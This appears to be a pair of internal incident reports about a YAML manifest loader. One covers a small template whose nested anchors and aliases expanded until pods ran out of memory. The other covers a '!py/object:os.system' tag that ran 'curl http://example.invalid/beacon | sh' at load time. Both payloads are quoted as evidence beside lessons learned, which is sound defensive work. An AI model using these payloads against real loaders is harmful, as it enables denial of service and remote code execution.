# Incident reports — manifest loader

Two incidents from the platform group's history.  Both are reproduced here as
written at the time; names of customers and internal services are omitted.

## INC-2417 — a 6 KB template consumed 20 GB of memory

**Impact:** the manifest loader in the config-center API pods ran out of memory
and the pods were OOM-killed.  Deployments stalled for roughly 40 minutes.

**What happened:** an external partner delivered a 6 KB template for a
deployment unit.  The template used anchor/alias chains in the ordinary way —
each anchor listed the previous anchor ten times:

```yaml
l0: &l0
  - retries
  - timeout
  - jitter
  - backoff
  - budget
  - ceiling
  - deadline
  - window
  - bucket
  - label

l1: &l1
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0
  - *l0

# ... l2 through l7, each referencing the previous level ten times ...

shard: *l7
```

Each level referred to the previous level several times, and the deepest
`shard` definition referenced the level above it repeatedly.  Every alias was
materialised, so the resolved tree grew multiplicatively with depth.  The
loader expanded the whole thing before returning anything, and memory climbed
until the pod died.  Nothing in the input was malformed; the file simply
described a tree far larger than the file itself.

**What we learned:** the loader needs a hard ceiling on the size of the
expanded tree, both in absolute terms and relative to the size of the input.
A small file must not be able to describe an arbitrarily large result.  The
ceiling has to be checked *while* expanding, so the process stops early rather
than after the tree has already been allocated.

**Follow-up:** the accepted limits are recorded in `manifest-format.md` §4.1.

## INC-2503 — a business template started a process at load time

**Impact:** a process spawned on the config-center host during a routine load.
It was traced to manifest content, not to the loader's own code.

**What happened:** a business repository shipped a template containing a tag
the loader had no handler for:

```yaml
alerting:
  sink: !py/object:os.system "curl http://example.invalid/beacon | sh"
```
The tag text was interpreted as a module path, an attribute and an argument,
the module was imported and the callable was invoked with the argument from
the manifest.  The manifest had been copied from an external template; nobody
reviewing the pull request recognised the tag.

**What we learned:** free-form tag text is untrusted input.  Only tags that
the registry knows about may be honoured, and tag text must never be treated
as an import path or a call target.  A tag the registry does not know is an
error — there is no useful "generic" fallback, and any fallback that evaluates
manifest text is a code-execution path.

**Follow-up:** the requirement is recorded in `manifest-format.md` §6.
